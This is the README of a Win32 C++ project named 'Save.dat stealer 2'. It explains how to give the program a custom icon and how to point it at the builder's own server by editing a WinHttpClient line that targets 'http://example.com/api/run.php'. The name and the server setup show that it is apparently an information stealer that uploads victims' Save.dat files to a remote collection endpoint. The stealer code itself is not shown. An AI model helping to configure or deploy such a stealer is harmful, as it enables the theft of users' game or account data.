========================================================================
    WIN32 APPLICATION : Save.dat stealer 2 Project Overview
========================================================================

Steps to create app with icon:
1.) Change these lines in Save.dat stealer 2.rc (in folder Save.dat stealer 2):
     //IDI_SAVEDATSTEALER2       ICON         "Save.dat stealer 2.ico"
     //IDI_SMALL               ICON         "small.ico"
   
   To:
     IDI_SAVEDATSTEALER2       ICON         "Save.dat stealer 2.ico"
     IDI_SMALL               ICON         "small.ico"

2.) Change files Save.dat stealer 2.ico and small.ico to icon which you wish to use!
    Please remember to keep their orginal sizes, so Save.dat stealer 2.ico to 32x32 and small.ico to 16x16!




Steps to set your server URL:
1.) Open project file in visual studio ( Save.dat stealer 2.sln )

2.) Find example url and change it to yours.
    The line which you need to change is WinHttpClient client(L"http://example.com/api/run.php"); // here put url to server part
    And in the fact you just need to change example.com to your domain.